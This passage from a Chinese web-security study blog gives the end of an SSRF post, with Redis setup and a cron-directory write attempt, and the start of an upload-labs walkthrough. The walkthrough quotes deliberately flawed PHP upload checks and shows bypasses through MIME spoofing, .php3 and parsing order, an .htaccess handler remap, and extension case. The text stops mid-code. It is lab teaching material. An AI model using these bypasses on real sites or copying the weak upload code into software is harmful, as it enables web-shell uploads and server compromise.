<p>Centos7：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 列出所有开放端口</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将6397端口加入防火墙</span></span><br><span class="line">firewall-cmd --zone=public --add-port=6397/tcp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启防火墙服务</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看是否生效</span></span><br><span class="line">firewall-cmd --zone=public --query-port=6397/tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>重启redis服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart redis</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试远程是否能够访问：</p>
<p>查看端口是否开放：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># nmap 47.97.199.89 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 12:55 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 47.97.199.89</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.31 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看是否能远程连接目标服务器的redis服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># redis-cli -h 47.97.199.89 -p 6379</span></span><br><span class="line">47.97.199.89:6379 &gt; info</span><br><span class="line">&gt; (返回redis基本信息)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>配置完成。</p>
</li>
</ol>
<h3 id="PHP-FPM-环境搭建">PHP-FPM 环境搭建</h3>
<p><a href="https://xz.aliyun.com/t/5598#toc-2">https://xz.aliyun.com/t/5598#toc-2</a></p>
<h3 id="Nginx-PHP-FPM-502错误排查">Nginx+PHP-FPM 502错误排查</h3>
<p><a href="https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/%E3%80%81">https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/、</a></p>
<h3 id="更改Redis的dir属性显示权限不足">更改Redis的dir属性显示权限不足</h3>
<p>运行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># redis-cli </span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此时redis服务是以非root身份启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># ps aux |grep redis</span></span><br><span class="line">redis     3849  0.0  0.3 142960  5804 ?        Ssl  13:24   0:00 /usr/bin/redis-server *:6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解决办法：</p>
<p>可以以root用户使用<code>redis-server</code>命令启动redis服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]# redis-server &#x2F;etc&#x2F;redis.conf</span><br><span class="line">[root@ca0y1h-centos ~]# ps aux | grep redis</span><br><span class="line">root      3856  0.0  0.2  22132  5168 pts&#x2F;1    S+   13:24   0:00 redis-cli</span><br><span class="line">root      4245  0.0  0.2 142960  5312 ?        Ssl  13:28   0:00 redis-server *:6379</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p><a href="https://joychou.org/web/phpssrf.html#directory0470238852615231466">https://joychou.org/web/phpssrf.html#directory0470238852615231466</a></p>
<p><a href="https://www.evi1.cn/post/ssrf/">https://www.evi1.cn/post/ssrf/</a></p>
<p><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a></p>
<p><a href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之文件上传漏洞利用</title>
    <url>/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之文件上传漏洞利用">Web安全学习之文件上传漏洞利用</h1>
<p>在现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，然而向用户提供的功能越多，Web应用受到攻击的风险就越大，如果Web应用存在上传文件漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序上传到服务器中，获得网站权限。</p>
<h2 id="文件上传漏洞介绍">文件上传漏洞介绍</h2>
<p>在一般情况下，文件上传漏洞一般都是指“上传Web脚本能够被服务器解析”的问题。要完成这个攻击，需要满足如下几个条件：</p>
<ul>
<li>上传的文件后所在的目录要是Web容易能够覆盖到的路径，可以被Web容器解释执行。</li>
<li>用户能够从Web上访问到这个文件。</li>
<li>用户上传的文件不会被安全检查、格式化、图片压缩等功能改变了内容。</li>
</ul>
<h2 id="文件上传漏洞利用">文件上传漏洞利用</h2>
<p>本文结合<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>来对此种漏洞在PHP中的表现做一讲解。</p>
<h3 id="Pass-01-前端JS检验绕过">Pass-01 前端JS检验绕过</h3>
<h4 id="代码">代码</h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个前端验证的上传点，针对这种情况我们一般有以下3种绕过方法。</p>
<h4 id="绕过方式">绕过方式</h4>
<h5 id="禁用JS代码">禁用JS代码</h5>
<p>Chrome浏览器在控制台的设置中可以直接禁用JS代码。</p>
<h5 id="删除上传按钮的onsubmit属性">删除上传按钮的onsubmit属性</h5>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127101318.png" alt=""></p>
<h5 id="Burp修改后缀">Burp修改后缀</h5>
<p>先将想要上传的php脚本的后缀修改为jpg绕过前端，使用burp截断后修改jpg为php继续上传即可。</p>
<h3 id="Pass-02-MIME类型绕过">Pass-02 MIME类型绕过</h3>
<h4 id="代码-v2">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>白名单的方式检查Content-Type，使用MIME绕过。</p>
<h4 id="绕过方式-v2">绕过方式</h4>
<h5 id="MIME">MIME</h5>
<p>在客户端上传文件时，通过Burp抓取数据包，当上传一个php格式的文件时，可以看到数据包中的Content-Type的值时application/ostet-stream，而上传jpg格式的文件时，数据包中Content-Type的值是image/jpeg。</p>
<p>上传php格式文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127110018.png" alt=""></p>
<p>上传jpg格式文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127110145.png" alt=""></p>
<p>所以对于这种情况，我们只需要使用burp抓包并修改Content-Type字段的内容即可。</p>
<h3 id="Pass-03-利用特殊后缀名绕过">Pass-03 利用特殊后缀名绕过</h3>
<h4 id="代码-v3">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>仅仅过滤了.asp、.aspx、.php、.jsp后缀文件，可以更改httpd.conf使得可以解析.php2类似的后缀文件。</p>
<h4 id="绕过方式-v3">绕过方式</h4>
<h5 id="httpd-conf配置文件">httpd.conf配置文件</h5>
<p>上传一个php文件后，提示不允许上传.asp,.aspx,.php,.jsp后缀文件！</p>
<p>模拟一下真实操作，F12查看Response Header，服务器端是Apache+PHP 5.2.17，使用黑名单的方式过滤了</p>
<p>.asp,.aspx,.php,.jsp文件后缀。但是有些Apache是允许解析其他文件后缀的，例如在httpd.conf中，如果配置有如下代码，则能够解析php、php3和phtml。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure>
<p>所以我们这时只需要将文件名修改为.php3就可以成功上传shell。</p>
<h5 id="解析顺序">解析顺序</h5>
<p>在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止，所以如果上传的文件名类似1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127130103.png" alt=""></p>
<h3 id="Pass-04-利用-htaccess绕过">Pass-04 利用.htaccess绕过</h3>
<h4 id="代码-v4">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>黑名单过滤了一大堆文件名，考虑上传.htaccess文件使得Apache可以将jpg文件解析成php文件。</p>
<h4 id="绕过方式-v4">绕过方式</h4>
<h5 id="解析顺序-v2">解析顺序</h5>
<p>同Pass-03</p>
<h5 id="htaccess文件">.htaccess文件</h5>
<blockquote>
<p>什么是.htaccess？</p>
<ol>
<li>.htaccess是一个纯文本文件，里面存放Apache服务器配置相关指令；</li>
<li>.htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等；</li>
<li>.htaccess的用途范围主要针对当前目录。</li>
</ol>
</blockquote>
<p>我们可以上传一个.htaccess文件，使得Apache可以将jpg文件解析成php文件，但要注意并不是任何时候都可以上传一个有效的.htaccess文件，在让.htaccess生效之前还需要对httpd.conf文件进行配置：</p>
<ol>
<li>
<p>修改httpd.conf，启用AllowOverride：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>修改httpd.conf，增加如下语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_module modules&#x2F;mod_rewrite.so</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>.htaccess文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<p>再上传.htaccess文件，这样Apache就可以将jpg文件解析成php文件。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127185226.png" alt=""></p>
<h3 id="Pass-05-利用后缀名大小写绕过">Pass-05 利用后缀名大小写绕过</h3>
<h4 id="代码-v5">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v5">绕过方式</h4>
<h5 id="解析顺序-v3">解析顺序</h5>
<p>分析代码，我们可以看到这句<code>$file_ext = strrchr($file_name, '.');</code>中的<code>strrchr()</code>函数是有点问题的。这个函数的意思是“函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符”。所以和Pass-03相似：当碰到不认识的扩展名时，将会从后向前解析，直到碰到认识的 扩展名，如果都不认识，则会暴露其源码。</p>
<h5 id="大小写绕过">大小写绕过</h5>
<p>可以直接将文件改为.PHP后缀，Apache照样成功解析。</p>
<h3 id="Pass-06-利用空格绕过">Pass-06 利用空格绕过</h3>
<h4 id="代码-v6">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span 